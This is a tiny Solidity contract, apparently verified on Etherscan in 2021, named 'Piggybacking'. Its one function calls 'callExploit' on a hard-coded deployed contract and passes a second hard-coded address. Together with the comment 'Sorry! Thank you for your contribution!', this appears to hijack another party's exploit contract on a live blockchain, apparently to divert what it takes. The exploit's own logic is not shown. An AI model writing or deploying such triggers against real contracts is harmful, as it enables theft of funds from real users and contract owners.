/**
 *Submitted for verification at Etherscan.io on 2021-11-08
*/

pragma solidity ^0.4.21;

interface returnSmarx {
    function callExploit(address) external;
}

contract Piggybacking {

    function go() public {
        // Sorry! Thank you for your contribution!
        returnSmarx(0xCb95E9ebAdc0dE6b7B294f9d9d774f79BD09FC58).callExploit(0xf54E4f1c383ea93af576706c67439e1B39ae2560);
    }
}